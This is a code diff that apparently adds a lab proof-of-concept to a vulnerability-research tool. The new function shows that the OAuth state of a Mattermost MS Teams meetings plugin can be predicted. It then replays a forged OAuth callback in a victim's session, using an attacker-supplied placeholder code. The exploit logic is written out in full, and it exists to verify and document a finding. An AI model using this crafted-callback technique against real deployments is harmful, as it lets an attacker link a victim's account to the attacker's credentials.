@@ -15,6 +15,7 @@ import {
   watchFor,
   Mattermost,
   nothingWithin,
+  PLUGIN_ID,
 } from "../lab/mattermost.ts"
 
 function message(error: unknown): string {
@@ -145,6 +146,102 @@ export async function provePropsHijack(): Promise<number> {
       { mode: 0o600 }
     )
     return hijacked ? 0 : 1
+  } catch (error) {
+    console.error(`error:  ${message(error)}`)
+    return 1
+  }
+}
+
+const STATE_PREFIX = "msteamsmeetinguserstate"
+const ATTACKER_CODE = "ATTACKER-SUPPLIED-AUTHORIZATION-CODE"
+
+/** The victim's session calls one plugin route and returns the status and body, following no redirect. */
+async function victimCalls(
+  lab: Lab,
+  token: string,
+  path: string
+): Promise<{ status: number; body: string; location: string | null }> {
+  const response = await fetch(lab.base + path, {
+    headers: { Authorization: `Bearer ${token}` },
+    redirect: "manual",
+    signal: AbortSignal.timeout(60_000),
+  })
+  return {
+    status: response.status,
+    body: (await response.text()).slice(0, 400),
+    location: response.headers.get("location"),
+  }
+}
+
+/**
+ * Partial proof of the OAuth state finding: the state is what an attacker can compute, a wrong
+ * one is refused, and the victim's session is accepted with the attacker's code up to the point
+ * where the plugin tries to exchange it. The lab cannot reach Microsoft, so the exchange fails.
+ */
+export async function proveOAuthState(): Promise<number> {
+  try {
+    const lab = loadLab()
+    if (!lab) throw new Error("no lab. Run: shuvuln lab up")
+    const victim = await Mattermost.login(lab.base, ACCOUNTS.victim)
+    const me = (await victim.request("GET", "/api/v4/users/me")) as { id: string }
+    await runCommand(lab, ACCOUNTS.victim, "/mstmeetings connect")
+    const token = victim.sessionToken()
+    const shown = await victimCalls(
+      lab,
+      token,
+      `/plugins/${PLUGIN_ID}/oauth2/connect?channelID=${lab.channelId}`
+    )
+    const state = shown.location ? (new URL(shown.location).searchParams.get("state") ?? "") : ""
+    const predicted = `${STATE_PREFIX}_${me.id}_${lab.channelId}_true`
+    console.log(`the connect redirect carries the state: ${state}`)
+    console.log(`computed from the victim's id, the channel id and a flag: ${predicted}`)
+    const predictable = state === predicted
+
+    const wrongChannel = await victimCalls(
+      lab,
+      token,
+      `/plugins/${PLUGIN_ID}/oauth2/complete?code=${ATTACKER_CODE}&state=${STATE_PREFIX}_${me.id}_someotherchannel_true`
+    )
+    console.log(
+      `control, state naming another channel: ${wrongChannel.status} ${wrongChannel.body}`
+    )
+    const controlRefused = wrongChannel.status === 400
+
+    const crafted = await victimCalls(
+      lab,
+      token,
+      `/plugins/${PLUGIN_ID}/oauth2/complete?code=${ATTACKER_CODE}&state=${predicted}`
+    )
+    console.log(`crafted callback in the victim's session: ${crafted.status} ${crafted.body}`)
+    const accepted =
+      crafted.status !== 400 && crafted.status !== 401 && crafted.body !== "invalid state"
+
+    const home = process.env.SHUVULN_HOME ?? ""
+    mkdirSync(join(home, "proofs"), { recursive: true, mode: 0o700 })
+    writeFileSync(
+      join(home, "proofs", "msteams-oauth-state.json"),
+      JSON.stringify(
+        {
+          provedAt: new Date().toISOString(),
+          lab,
+          state,
+          predicted,
+          predictable,
+          controlRefused,
+          crafted,
+          accepted,
+          note: "Partial: the code exchange fails only because the lab has no route to Microsoft.",
+        },
+        null,
+        2
+      ),
+      { mode: 0o600 }
+    )
+    const passed = predictable && controlRefused && accepted
+    console.log(
+      `state predictable: ${predictable}; wrong state refused: ${controlRefused}; crafted callback accepted up to the exchange: ${accepted}`
+    )
+    return passed ? 0 : 1
   } catch (error) {
     console.error(`error:  ${message(error)}`)
     return 1
